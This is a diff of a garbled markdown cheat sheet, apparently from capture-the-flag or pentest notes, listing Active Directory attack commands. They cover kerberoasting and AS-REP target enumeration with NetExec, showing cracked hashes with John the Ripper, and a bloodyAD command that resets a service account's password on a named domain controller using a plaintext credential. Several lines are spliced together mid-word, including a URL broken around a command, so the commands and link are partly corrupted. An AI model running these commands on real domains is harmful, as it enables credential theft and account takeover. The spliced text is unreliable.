@@ -109,8 +109,11 @@ nxc ldap $target -u 'username' -p 'username' --kerberoastPermisionsing output.tx
 ```bash
 nxc ldap $target -u 'username' -p '' --john --show hash.john
 no-preauth-targets kerberoastable.list --kerberoasting output.txt
-```john --show hash.john
+```
 
+```bash
+john --show hash.john
+```
 
 More info about https://www.nebloodyAD --host "10.1.107.118" -d 'dc01.hacksmarter.local' -u  'yorinobu' -p  'FuckPass!@' set password 'soulkiller.svc' 'FuckPass!@!@@'
 texec.wiki/ldap-protocol/kerberoasting#kerberoasting[here]
